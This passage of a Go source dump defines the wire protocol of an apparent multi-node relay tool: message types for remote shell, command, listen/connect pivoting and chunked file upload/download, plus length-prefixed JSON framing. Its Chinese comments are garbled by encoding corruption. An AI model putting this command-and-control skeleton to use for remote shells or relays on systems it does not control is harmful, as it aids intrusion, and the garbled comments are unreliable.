		if node.ParentID == -1 {
			printNode(node.ID, 0)
		}
	}
}

æ–‡ä»¶ï¼š./core/protocol/file_transfer.go
å†…å®¹ï¼š
package protocol

const (
	MsgUploadInit  MessageType = "upload_init"  // åˆå§‹åŒ–ä¸Šä¼ è¯·æ±‚ï¼ˆå«æ–‡ä»¶åå’Œé•¿åº¦ï¼‰
	MsgUploadChunk MessageType = "upload_chunk" // ä¸Šä¼ æ•°æ®å—
	MsgUploadDone  MessageType = "upload_done"  // ä¸Šä¼ å®Œæˆé€šçŸ¥

	MsgDownloadInit  MessageType = "download_init"  // è¯·æ±‚ä¸‹è½½æ–‡ä»¶
	MsgDownloadChunk MessageType = "download_chunk" // ä¸‹è½½æ•°æ®å—
	MsgDownloadDone  MessageType = "download_done"  // ä¸‹è½½å®Œæˆé€šçŸ¥
)

type UploadInitPayload struct {
	Filename string `json:"filename"`
	Filesize int64  `json:"filesize"`
}

type UploadChunkPayload struct {
	Data []byte `json:"data"`
}

type DownloadInitPayload struct {
	Filename string `json:"filename"`
}

type DownloadChunkPayload struct {
	Data []byte `json:"data"`
}

æ–‡ä»¶ï¼š./core/protocol/message.go
å†…å®¹ï¼š
package protocol

import (
	"bytes"
	"encoding/binary"
	"encoding/json"
	"fmt"
)

// MessageType å®šä¹‰äº†æ¶ˆæ¯ç±»å‹ï¼Œå¦‚ handshakeã€shellã€upload ç­‰
type MessageType string

const (
	MsgHandshake MessageType = "handshake"
	MsgHeartbeat MessageType = "heartbeat"
	MsgCommand   MessageType = "command"
	MsgResponse  MessageType = "response"
	MsgShell     MessageType = "shell"
	// æ‹“æ‰‘ç›¸å…³æ¶ˆæ¯	ã€Œ
	MsgListen        MessageType = "listen"
	MsgConnect       MessageType = "connect"
	MsgBindRelayConn MessageType = "bind_relay_conn" // ç”¨äºè½¬å‘è¿æ¥è¯·æ±‚çš„å›å¤
)

// Message æ˜¯åŸºæœ¬é€šä¿¡ç»“æ„
// ç»“æ„ä½“ç»è¿‡ JSON ç¼–ç åå†åŠ ä¸Šé•¿åº¦å‰ç¼€å‘é€
type Message struct {
	Type       MessageType // such as handshake,shell,upload
	Payload    []byte      // the data to be sent, such as command or file content
	ToNodeID   int         `json:"to,omitempty"`   // ç›®æ ‡èŠ‚ç‚¹IDï¼Œ,è¯¥å­—æ®µä»…ç”± admin â†’ relay agent æ—¶è®¾ç½®ï¼Œç”¨äºè½¬å‘ç»™ child èŠ‚ç‚¹
	FromNodeID int         `json:"from,omitempty"` // æºèŠ‚ç‚¹IDï¼Œé€šå¸¸ç”± agent â†’ relay agent æ—¶è®¾ç½®
}

type BindRelayConnPayload struct {
	ID int `json:"id"` // è¦ç»‘å®šçš„ç›®æ ‡ Node ID
}

// EncodeMessage å°†Messageç¼–ç å¸¦é•¿åº¦å‰ç¼€çš„å­—èŠ‚æµ
func EncodeMessage(msg Message) ([]byte, error) {
	data, err := json.Marshal(msg)
	if err != nil {
		return nil, err
	}
	buf := new(bytes.Buffer)
	// å†™å…¥é•¿åº¦å‰ç¼€(å¤§ç«¯å­—èŠ‚åº)
	err = binary.Write(buf, binary.BigEndian, uint32(len(data)))
	if err != nil {
		return nil, err
	}
	// å†™å…¥æ¶ˆæ¯å†…å®¹
	_, err = buf.Write(data)
	if err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

// DecodeMessage ä»å¸¦é•¿åº¦å‰ç¼€çš„å­—èŠ‚æµè§£ç ä¸ºMessage
func DecodeMessage(data []byte) (Message, error) {
	var msg Message
	if err := json.Unmarshal(data, &msg); err != nil {
		return msg, fmt.Errorf("decode json: %w", err)
	}
	return msg, nil
}

// ReadMessage ä»è¿æ¥ä¸­è¯»å–ä¸€ä¸ªå®Œæ•´çš„æ¶ˆæ¯å¸§ï¼ˆåŒ…æ‹¬é•¿åº¦å‰ç¼€å’Œå†…å®¹ï¼‰
func ReadMessage(reader *bytes.Reader) (Message, error) {
	var length uint32
	if err := binary.Read(reader, binary.BigEndian, &length); err != nil {
		return Message{}, fmt.Errorf("read length: %w", err)
	}
	msgData := make([]byte, length)
	if _, err := reader.Read(msgData); err != nil {
		return Message{}, fmt.Errorf("read payload: %w", err)
	}
	return DecodeMessage(msgData)

}

å­æ–‡ä»¶å¤¹ï¼š./core/utils
æ–‡ä»¶ï¼š./core/utils/utils.go
å†…å®¹ï¼š
package utils

func BytesToUint32(b []byte) uint32 {
	return uint32(b[0])<<24 | uint32(b[1])<<16 | uint32(b[2])<<8 | uint32(b[3])
}

